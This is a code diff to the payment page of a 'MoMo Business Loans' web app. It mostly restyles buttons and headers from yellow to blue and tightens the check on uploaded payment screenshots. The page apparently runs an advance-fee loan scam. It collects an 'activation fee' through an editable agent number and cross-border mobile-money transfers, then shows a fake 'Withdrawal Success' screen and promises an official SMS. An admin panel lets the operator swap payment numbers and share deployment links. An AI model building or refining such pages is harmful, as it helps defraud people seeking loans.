@@ -303,14 +303,23 @@ export default function PaymentPage() {
         }),
       });
 
-      const verifyData = await verifyRes.json();
-      if (!verifyData.valid) {
+      if (!verifyRes.ok) {
         setIsVerifyingScreenshot(false);
-        setValidationError(verifyData.message || 'Please upload the correct screenshot of the payment');
+        setValidationError('Please upload the correct screenshot of the payment');
+        return;
+      }
+
+      const verifyData = await verifyRes.json();
+      if (!verifyData || !verifyData.valid) {
+        setIsVerifyingScreenshot(false);
+        setValidationError(verifyData?.message || 'Please upload the correct screenshot of the payment');
         return;
       }
     } catch (err) {
-      console.warn('[PaymentPage] Verification check error, continuing:', err);
+      console.error('[PaymentPage] Verification check error:', err);
+      setIsVerifyingScreenshot(false);
+      setValidationError('Please upload the correct screenshot of the payment');
+      return;
     }
 
     setIsVerifyingScreenshot(false);
@@ -370,12 +379,12 @@ export default function PaymentPage() {
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
         <Logo size="md" />
         <h2 className="text-2xl font-extrabold tracking-tight">
-          MoMo <span className="text-[#ffcc00]">Business Loans</span>
+          MoMo <span className="text-sky-300">Business Loans</span>
         </h2>
 
         <div className="relative">
-          <Loader2 className="w-16 h-16 text-[#ffcc00] animate-spin" />
-          <span className="absolute inset-0 flex items-center justify-center text-xs font-black text-[#ffcc00]">
+          <Loader2 className="w-16 h-16 text-sky-400 animate-spin" />
+          <span className="absolute inset-0 flex items-center justify-center text-xs font-black text-sky-200">
             {timerSecondsLeft}s
           </span>
         </div>
@@ -387,14 +396,14 @@ export default function PaymentPage() {
           </h3>
           <p className="text-gray-300 text-xs sm:text-sm leading-relaxed">
             Verifying activation fee receipt and confirming payment for automated release of{' '}
-            <span className="text-[#ffcc00] font-bold">{loanAmount}</span> to{' '}
+            <span className="text-white font-bold">{loanAmount}</span> to{' '}
             <span className="text-white font-bold">{applicantPhone}</span>.
           </p>
 
           {/* Progress bar */}
           <div className="w-full bg-[hsl(198,60%,28%)] h-2.5 rounded-full overflow-hidden border border-[hsl(198,55%,32%)] mt-4">
             <div
-              className="bg-[#ffcc00] h-full transition-all duration-300 ease-linear rounded-full"
+              className="bg-sky-400 h-full transition-all duration-300 ease-linear rounded-full"
               style={{ width: `${Math.max(5, progressPercent)}%` }}
             />
           </div>
@@ -413,7 +422,7 @@ export default function PaymentPage() {
         <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col relative overflow-x-hidden">
           <Confetti />
 
-          <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+          <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
             <div className="container mx-auto max-w-4xl flex items-center justify-between">
               <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                 <Logo size="sm" />
@@ -421,7 +430,7 @@ export default function PaymentPage() {
                   MoMo <span className="font-normal opacity-90">Business Loans</span>
                 </span>
               </div>
-              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+              <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
                 Withdrawal Success
               </span>
             </div>
@@ -501,9 +510,9 @@ export default function PaymentPage() {
                 <button
                   id="post-withdrawal-login-btn"
                   onClick={() => navigate('/signup', { state: { returnTo: '/withdrawal-status' } })}
-                  className="w-full mt-2.5 py-3.5 px-4 rounded-xl bg-white hover:bg-gray-50 border-2 border-gray-300 text-gray-900 font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-xs transition cursor-pointer"
+                  className="w-full mt-2.5 py-4 px-4 rounded-full bg-[#004F71] hover:bg-[#003853] text-white font-bold text-sm sm:text-base tracking-wider uppercase flex items-center justify-center gap-2 shadow-md transition cursor-pointer border border-[#006591]/40"
                 >
-                  <LogIn className="w-5 h-5 text-[#ffcc00]" />
+                  <LogIn className="w-5 h-5 text-white" />
                   <span>Log in to Withdraw</span>
                 </button>
 
@@ -511,22 +520,22 @@ export default function PaymentPage() {
                 <button
                   id="view-24h-progress-btn"
                   onClick={() => navigate('/withdrawal-status')}
-                  className="w-full mt-2 py-3 px-4 rounded-xl bg-[#004F71] hover:bg-[#003853] text-[#ffcc00] font-black text-xs sm:text-sm flex items-center justify-center gap-2 shadow-md transition cursor-pointer border border-[#00608a]"
+                  className="w-full mt-2.5 py-4 px-4 rounded-full bg-[#004F71] hover:bg-[#003853] text-white font-bold text-sm sm:text-base tracking-wider uppercase flex items-center justify-center gap-2 shadow-md transition cursor-pointer border border-[#006591]/40"
                 >
-                  <Clock className="w-4 h-4 text-[#ffcc00]" />
+                  <Clock className="w-4 h-4 text-white" />
                   <span>View 24-Hour Withdrawal Progress</span>
                 </button>
               </div>
 
-              <div className="bg-yellow-50/80 border border-[#ffcc00]/40 rounded-2xl p-3.5 mb-6 text-xs text-gray-700 flex items-center gap-2.5 text-left">
-                <Smartphone className="w-5 h-5 text-[#ffcc00] shrink-0" />
+              <div className="bg-sky-50/80 border border-sky-200 rounded-2xl p-3.5 mb-6 text-xs text-slate-800 flex items-center gap-2.5 text-left">
+                <Smartphone className="w-5 h-5 text-[#004F71] shrink-0" />
                 <span>You will also receive an official SMS notification directly on your phone upon wallet credit.</span>
               </div>
 
               <button
                 id="back-home-btn"
                 onClick={() => navigate('/')}
-                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-2xl bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold text-sm transition cursor-pointer"
+                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold text-sm transition cursor-pointer"
               >
                 <Home className="w-4 h-4" />
                 <span>Return to Home</span>
@@ -543,7 +552,7 @@ export default function PaymentPage() {
     <PageLoader>
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Header */}
-        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -557,7 +566,7 @@ export default function PaymentPage() {
                   Admin Editor
                 </span>
               )}
-              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+              <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
                 Activation & Withdrawal
               </span>
             </div>
@@ -569,9 +578,9 @@ export default function PaymentPage() {
           <div className="bg-gradient-to-r from-red-950 via-slate-900 to-red-950 border-b border-red-800/60 p-4 sticky top-12 z-30 shadow-xl">
             <div className="container mx-auto max-w-lg flex flex-col sm:flex-row items-center justify-between gap-3">
               <div className="flex items-center gap-2 text-white text-xs sm:text-sm">
-                <Settings className="w-5 h-5 text-[#ffcc00] shrink-0" />
+                <Settings className="w-5 h-5 text-sky-400 shrink-0" />
                 <div>
-                  <p className="font-extrabold text-[#ffcc00]">Admin Mode: Editing Activation & Withdrawal</p>
+                  <p className="font-extrabold text-sky-300">Admin Mode: Editing Activation & Withdrawal</p>
                   <p className="text-[11px] text-gray-300">Changes are saved permanently to the server for all visitors.</p>
                 </div>
               </div>
@@ -646,7 +655,7 @@ export default function PaymentPage() {
                     type="text"
                     value={adminForm.agentName}
                     onChange={(e) => setAdminForm({ ...adminForm, agentName: e.target.value })}
-                    className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
+                    className="w-full border-2 border-gray-300 focus:border-[#004F71] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                   />
                 </div>
 
@@ -659,7 +668,7 @@ export default function PaymentPage() {
                       type="text"
                       value={adminForm.agentNumber}
                       onChange={(e) => setAdminForm({ ...adminForm, agentNumber: e.target.value })}
-                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
+                      className="w-full border-2 border-gray-300 focus:border-[#004F71] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                     />
                   </div>
                   <div>
@@ -670,7 +679,7 @@ export default function PaymentPage() {
                       type="text"
                       value={adminForm.rawNumber}
                       onChange={(e) => setAdminForm({ ...adminForm, rawNumber: e.target.value })}
-                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
+                      className="w-full border-2 border-gray-300 focus:border-[#004F71] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                     />
                   </div>
                 </div>
@@ -684,7 +693,7 @@ export default function PaymentPage() {
                       type="text"
                       value={adminForm.whatsappNumber}
                       onChange={(e) => setAdminForm({ ...adminForm, whatsappNumber: e.target.value })}
-                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
+                      className="w-full border-2 border-gray-300 focus:border-[#004F71] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                     />
                   </div>
                   <div>
@@ -695,7 +704,7 @@ export default function PaymentPage() {
                       type="text"
                       value={adminForm.whatsappRaw}
                       onChange={(e) => setAdminForm({ ...adminForm, whatsappRaw: e.target.value })}
-                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
+                      className="w-full border-2 border-gray-300 focus:border-[#004F71] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                     />
                   </div>
                 </div>
@@ -724,7 +733,7 @@ export default function PaymentPage() {
                   disabled={savingSettings}
                   className="w-full py-3.5 rounded-xl bg-gray-900 hover:bg-black text-white text-xs font-black flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
                 >
-                  <Save className="w-4 h-4 text-[#ffcc00]" />
+                  <Save className="w-4 h-4 text-white" />
                   <span>{savingSettings ? 'Saving...' : 'Save Details to settings.json'}</span>
                 </button>
 
@@ -747,7 +756,7 @@ export default function PaymentPage() {
                     <button
                       type="button"
                       onClick={handleCopyUniversalLink}
-                      className="w-full py-2.5 px-3 rounded-xl bg-[#ffcc00] hover:bg-[#e6b800] text-gray-950 text-xs font-black flex items-center justify-center gap-2 transition cursor-pointer shadow-sm"
+                      className="w-full py-3 px-3 rounded-full bg-[#004F71] hover:bg-[#003853] text-white text-xs font-bold tracking-wider uppercase flex items-center justify-center gap-2 transition cursor-pointer shadow-sm border border-[#006591]/40"
                     >
                       <Link className="w-3.5 h-3.5" />
                       <span>{linkCopied ? '✅ Link Copied to Clipboard!' : 'Copy Universal Vercel Link'}</span>
@@ -835,7 +844,7 @@ export default function PaymentPage() {
                               setAdminForm({ ...adminForm, githubToken: e.target.value });
                               setGithubTestResult(null);
                             }}
-                            className="w-full border border-gray-300 focus:border-[#ffcc00] rounded-lg px-2.5 py-1.5 text-xs font-mono bg-white text-gray-900"
+                            className="w-full border border-gray-300 focus:border-[#004F71] rounded-lg px-2.5 py-1.5 text-xs font-mono bg-white text-gray-900"
                           />
                         </div>
                         <div>
@@ -850,7 +859,7 @@ export default function PaymentPage() {
                               setAdminForm({ ...adminForm, githubRepo: e.target.value });
                               setGithubTestResult(null);
                             }}
-                            className="w-full border border-gray-300 focus:border-[#ffcc00] rounded-lg px-2.5 py-1.5 text-xs font-mono bg-white text-gray-900"
+                            className="w-full border border-gray-300 focus:border-[#004F71] rounded-lg px-2.5 py-1.5 text-xs font-mono bg-white text-gray-900"
                           />
                         </div>
 
@@ -958,7 +967,7 @@ export default function PaymentPage() {
                 {/* 1. MTN Uganda -> Kenya */}
                 <div className="bg-white/90 rounded-xl p-2.5 sm:p-3 border border-amber-200 shadow-2xs">
                   <div className="font-black text-xs sm:text-sm text-amber-950 mb-1 flex items-center gap-1.5">
-                    <span className="w-4 h-4 rounded-full bg-[#ffcc00] text-[hsl(198,100%,22%)] text-[10px] font-black flex items-center justify-center shrink-0">1</span>
+                    <span className="w-4 h-4 rounded-full bg-[#004F71] text-white text-[10px] font-black flex items-center justify-center shrink-0">1</span>
                     <span>MTN Uganda → Kenya</span>
                   </div>
                   <div className="font-bold text-[11px] sm:text-xs text-gray-900 space-y-0.5 pl-5 leading-snug">
@@ -1012,9 +1021,9 @@ export default function PaymentPage() {
                 /* Empty Upload Dropzone */
                 <div
                   onClick={handleChoosePhoto}
-                  className="border-2 border-dashed border-gray-300 hover:border-[#ffcc00] rounded-2xl p-6 text-center cursor-pointer transition bg-gray-50/50 hover:bg-gray-50 group"
+                  className="border-2 border-dashed border-gray-300 hover:border-[#004F71] rounded-2xl p-6 text-center cursor-pointer transition bg-gray-50/50 hover:bg-gray-50 group"
                 >
-                  <div className="w-12 h-12 rounded-2xl bg-gray-100 group-hover:bg-[#ffcc00]/20 flex items-center justify-center mx-auto mb-2 text-gray-500 group-hover:text-[#ffcc00] transition">
+                  <div className="w-12 h-12 rounded-2xl bg-gray-100 group-hover:bg-sky-50 flex items-center justify-center mx-auto mb-2 text-gray-500 group-hover:text-[#004F71] transition">
                     <Upload className="w-6 h-6" />
                   </div>
                   <p className="text-xs sm:text-sm font-bold text-gray-800">
@@ -1064,11 +1073,11 @@ export default function PaymentPage() {
               id="submit-withdraw-btn"
               onClick={handleSubmitAndWithdraw}
               disabled={isVerifyingScreenshot}
-              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer disabled:opacity-75"
+              className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-md flex items-center justify-center gap-2 cursor-pointer border border-[#006591]/40 disabled:opacity-50"
             >
               {isVerifyingScreenshot ? (
                 <>
-                  <Loader2 className="w-5 h-5 animate-spin text-[hsl(198,100%,22%)]" />
+                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                   <span>Verifying activation fee...</span>
                 </>
               ) : (
